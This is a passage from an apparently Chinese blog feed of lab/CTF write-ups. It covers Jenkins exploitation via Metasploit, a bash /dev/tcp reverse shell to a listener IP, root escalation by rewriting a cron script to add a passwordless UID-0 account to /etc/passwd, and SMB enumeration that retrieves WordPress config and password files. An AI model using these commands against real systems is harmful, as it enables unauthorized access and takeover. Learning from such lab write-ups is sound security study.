    <content><![CDATA[<p>NMAP扫描报告 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [19:55:54] C:130</span></span><br><span class="line">$ nmap 172.17.135.54 -O -sS -A -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-29 19:55 CST</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 99.99% <span class="keyword">done</span>; ETC: 19:56 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.54</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)</span><br><span class="line">|_  256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">|_http-title: Jarbas - O Seu Mordomo Virtual!</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.2 - 4.6</span></span><br><span class="line"><span class="string">Network Distance: 3 hops</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 256/tcp)</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   ...</span></span><br><span class="line"><span class="string">2   4.76 ms bogon (192.168.230.30)</span></span><br><span class="line"><span class="string">3   1.59 ms 172.17.135.54</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 39.08 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure> 可以看出
使用的是Jetty,在8080端口<code>http://172.17.135.54:8080</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:48] </span></span><br><span class="line">$ dirb http://172.17.135.54:8080 &gt; /home/divint3/ctf_chache/list.txt </span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:07:57] </span></span><br><span class="line">$ sed <span class="string">&#x27;/^==&gt;.*/!d&#x27;</span> /home/divint3/ctf_chache/list.txt</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/               </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/                  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/         </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/            </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/   </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/classes/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/fields/  </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/name/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/package/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/class/      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/classes/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/fields/     </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/name/       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/git/class/package/    </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/class/ </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/classes/</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.54:8080/assets/class/class/fields/</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3/web/blog [20:15:41] C:1</span></span><br><span class="line">$ sed -e <span class="string">&#x27;/^+.*/!d&#x27;</span> /home/divint3/ctf_chache/list.txt </span><br><span class="line">+ http://172.17.135.54:8080/error (CODE:400|SIZE:5329)</span><br><span class="line">+ http://172.17.135.54:8080/favicon.ico (CODE:200|SIZE:17542)</span><br><span class="line">+ http://172.17.135.54:8080/login (CODE:200|SIZE:5988)</span><br><span class="line">+ http://172.17.135.54:8080/logout (CODE:302|SIZE:0</span><br><span class="line">+ http://172.17.135.54:8080/robots.txt (CODE:200|SIZE:71</span><br><span class="line">+ http://172.17.135.54:8080/assets/dynamic (CODE:500|SIZE:13989) </span><br></pre></td></tr></table></figure>
<p>dirb发现robots.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># we don&#x27;t want robots to click &quot;build&quot; links</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure></p>
<p>先测试一下脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/jenkins_script_console) &gt; search jenkins</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                  Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----       -----  -----------</span><br><span class="line">   1   auxiliary/gather/jenkins_cred_recovery                                 normal     Yes    Jenkins Domain Credential Recovery</span><br><span class="line">   2   auxiliary/scanner/http/jenkins_command                                 normal     Yes    Jenkins-CI Unauthenticated Script-Console Scanner</span><br><span class="line">   3   auxiliary/scanner/http/jenkins_enum                                    normal     Yes    Jenkins-CI Enumeration</span><br><span class="line">   4   auxiliary/scanner/http/jenkins_login                                   normal     Yes    Jenkins-CI Login Utility</span><br><span class="line">   5   auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum                   normal     No     Jenkins Server Broadcast Enumeration</span><br><span class="line">   6   exploit/linux/misc/jenkins_java_deserialize           2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability</span><br><span class="line">   7   exploit/linux/misc/jenkins_ldap_deserialize           2016-11-16       excellent  Yes    Jenkins CLI HTTP Java Deserialization Vulnerability</span><br><span class="line">   8   exploit/linux/misc/opennms_java_serialize             2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution</span><br><span class="line">   9   exploit/multi/http/jenkins_metaprogramming            2019-01-08       excellent  Yes    Jenkins ACL Bypass and Metaprogramming RCE</span><br><span class="line">   10  exploit/multi/http/jenkins_script_console             2013-01-18       good       Yes    Jenkins-CI Script-Console Java Execution</span><br><span class="line">   11  exploit/multi/http/jenkins_xstream_deserialize        2016-02-24       excellent  Yes    Jenkins XStream Groovy classpath Deserialization Vulnerability</span><br><span class="line">   12  exploit/windows/misc/ibm_websphere_java_deserialize   2015-11-06       excellent  No     IBM WebSphere RCE Java Deserialization Vulnerability</span><br><span class="line">   13  post/multi/gather/jenkins_gather                                       normal     No     Jenkins Credential Collector</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>使用<code>exploit/multi/http/jenkins_metaprogramming</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 172.17.135.59 </span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 172.17.135.80</span><br><span class="line"><span class="built_in">set</span> lport 4442</span><br><span class="line"><span class="built_in">set</span> ForceExploit <span class="literal">true</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>反弹shell至本地</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/172.17.135.80/4442 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"><span class="comment"># root @ Divint3 in /home/divint3 [18:58:07] C:1</span></span><br><span class="line">$ nc -lvp 4442</span><br><span class="line">listening on [any] 4442 ...</span><br><span class="line">connect to [172.17.135.80] from bogon [172.17.135.59] 55308</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试suid文件提权, 没有特定文件</p>
<p>发现crontab <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>修改目标脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;sed -i &#x27;/^root.*/a divint3::0:0:root:/root:/bin/bash&#x27;&quot;</span> &gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure></p>
<p>等待一会 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">su divint3</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">[root@jarbas /]<span class="comment"># cd /root</span></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">Hey!</span><br><span class="line"></span><br><span class="line">Congratulations! You got it! I always knew you could <span class="keyword">do</span> it!</span><br><span class="line">This challenge was very easy, huh? =)</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> appreciating this machine.</span><br><span class="line"></span><br><span class="line">@tiagotvrs </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat /etc/passwd</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:997:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br><span class="line">jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>靶场63</title>
    <url>/%E9%9D%B6%E5%9C%BA63/</url>
    <content><![CDATA[<p>先看看网站源代码 找到图片存放的位置,看到一个特殊文件名,base64解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAEAAQAAAAAAAAdJAAAAJDhiNGY1YTk3LTQ3NTctNDE1Ny1hZmU4LTlhMWE4</span><br><span class="line">I$8b4f5a97-4757-4157-afe8-9a1a8</span><br></pre></td></tr></table></figure>
<p>nmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:49:41] C:130</span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:53:15] </span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn -A</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b5:38:66:0f:a1:ee:<span class="built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)</span><br><span class="line">|   2048 58:5a:63:69:d0:da:<span class="built_in">dd</span>:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)</span><br><span class="line">|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Silex v2.2.7</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/old/ /test/ /TR2/ /Backnode_files/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Backnode</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   server: Admin.<span class="built_in">local</span></span><br><span class="line">|   <span class="built_in">users</span>: 1.0</span><br><span class="line">|   servers: 1</span><br><span class="line">|   chans: 0</span><br><span class="line">|   lusers: 1</span><br><span class="line">|   lservers: 0</span><br><span class="line">|   <span class="built_in">source</span> ident: nmap</span><br><span class="line">|   <span class="built_in">source</span> host: 10.160.110.191</span><br><span class="line">|_  error: Closing <span class="built_in">link</span>: (nmap@10.160.110.191) [Client exited]</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 40m48s, deviation: 0s, median: 40m48s</span><br><span class="line">|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: lazysysadmin</span><br><span class="line">|   NetBIOS computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: lazysysadmin</span><br><span class="line">|_  System time: 2019-05-28T00:34:48+10:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.90 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>祭出dirb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 27 21:38:27 2019</span><br><span class="line">URL_BASE: http://172.17.135.63/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.63/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/apache/                                                                                                                                                    </span><br><span class="line">+ http://172.17.135.63/index.html (CODE:200|SIZE:36072)                                                                                                                                        </span><br><span class="line">+ http://172.17.135.63/info.php (CODE:200|SIZE:77255)                                                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/javascript/                                                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/old/                                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/phpmyadmin/                                                                                                                                                </span><br><span class="line">+ http://172.17.135.63/robots.txt (CODE:200|SIZE:92)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.63/server-status (CODE:403|SIZE:293)                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/test/                                                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wordpress/                                                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wp/                                                                                                                                                        </span><br></pre></td></tr></table></figure></p>
<p>匿名访问smb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [22:46:26] </span></span><br><span class="line">$ smbclient -L 172.17.135.63    </span><br><span class="line">WARNING: The <span class="string">&quot;syslog&quot;</span> option is deprecated</span><br><span class="line">Enter divint3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        share$          Disk      Sumshare</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (Web server)</span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Server               Comment</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        DESKTOP-IN4T2GV      </span></span><br><span class="line"><span class="string">        LAZYSYSADMIN         Web server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Workgroup            Master</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        WORKGROUP            DESKTOP-IN4T2GV</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># divint3 @ Divint3 in ~ [22:20:32] </span></span><br><span class="line"><span class="string">$ smbclient //172.17.135.63/share$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: The &quot;syslog&quot; option is deprecated</span></span><br><span class="line"><span class="string">Enter divint3&#x27;</span>s password: </span><br><span class="line">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  ..                                  D        0  Mon Aug 14 20:34:47 2017</span><br><span class="line">  wordpress                           D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  Backnode_files                      D        0  Mon Aug 14 20:08:26 2017</span><br><span class="line">  wp                                  D        0  Tue Aug 15 18:51:23 2017</span><br><span class="line">  deets.txt                           N      139  Mon Aug 14 20:20:05 2017</span><br><span class="line">  robots.txt                          N       92  Mon Aug 14 20:36:14 2017</span><br><span class="line">  todolist.txt                        N       79  Mon Aug 14 20:39:56 2017</span><br><span class="line">  apache                              D        0  Mon Aug 14 20:35:19 2017</span><br><span class="line">  index.html                          N    36072  Sun Aug  6 13:02:15 2017</span><br><span class="line">  info.php                            N       20  Tue Aug 15 18:55:19 2017</span><br><span class="line">  <span class="built_in">test</span>                                D        0  Mon Aug 14 20:35:10 2017</span><br><span class="line">  old                                 D        0  Mon Aug 14 20:35:13 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237820 blocks available</span><br><span class="line">smb: \&gt; get todolist.txt </span><br><span class="line">getting file \todolist.txt of size 79 as todolist.txt (8.6 KiloBytes/sec) (average 8.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get deets.txt </span><br><span class="line">getting file \deets.txt of size 139 as deets.txt (5.0 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> wordpress</span><br><span class="line">smb: \wordpress\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  ..                                  D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  wp-config-sample.php                N     2853  Wed Dec 16 17:58:26 2015</span><br><span class="line">  wp-trackback.php                    N     4513  Sat Oct 15 03:39:28 2016</span><br><span class="line">  wp-admin                            D        0  Thu Aug  3 05:02:02 2017</span><br><span class="line">  wp-settings.php                     N    16200  Fri Apr  7 02:01:42 2017</span><br><span class="line">  wp-blog-header.php                  N      364  Sat Dec 19 19:20:28 2015</span><br><span class="line">  index.php                           N      418  Wed Sep 25 08:18:11 2013</span><br><span class="line">  wp-cron.php                         N     3286  Mon May 25 01:26:25 2015</span><br><span class="line">  wp-links-opml.php                   N     2422  Mon Nov 21 10:46:30 2016</span><br><span class="line">  readme.html                         N     7413  Mon Dec 12 16:01:39 2016</span><br><span class="line">  wp-signup.php                       N    29924  Tue Jan 24 19:08:42 2017</span><br><span class="line">  wp-content                          D        0  Mon Aug 21 18:07:27 2017</span><br><span class="line">  license.txt                         N    19935  Tue Jan  3 01:58:42 2017</span><br><span class="line">  wp-mail.php                         N     8048  Wed Jan 11 13:13:43 2017</span><br><span class="line">  wp-activate.php                     N     5447  Wed Sep 28 05:36:28 2016</span><br><span class="line">  .htaccess                           H       35  Tue Aug 15 19:40:13 2017</span><br><span class="line">  xmlrpc.php                          N     3065  Thu Sep  1 00:31:29 2016</span><br><span class="line">  wp-login.php                        N    34327  Sat May 13 01:12:46 2017</span><br><span class="line">  wp-load.php                         N     3301  Tue Oct 25 11:15:30 2016</span><br><span class="line">  wp-comments-post.php                N     1627  Mon Aug 29 20:00:32 2016</span><br><span class="line">  wp-config.php                       N     3703  Mon Aug 21 17:25:14 2017</span><br><span class="line">  wp-includes                         D        0  Thu Aug  3 05:02:03 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237744 blocks available</span><br><span class="line">smb: \wordpress\&gt; get wp-config.php </span><br><span class="line">getting file \wordpress\wp-config.php of size 3703 as wp-config.php (452.0 KiloBytes/sec) (average 452.0 KiloBytes/sec)</span><br><span class="line">smb: \wordpress\&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure> deets.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>todolist.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Prevent users from being able to view to web root using the local file browser</span><br></pre></td></tr></table></figure></p>
<p>wp-config.php的内容包含数据库配置,故下载 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table 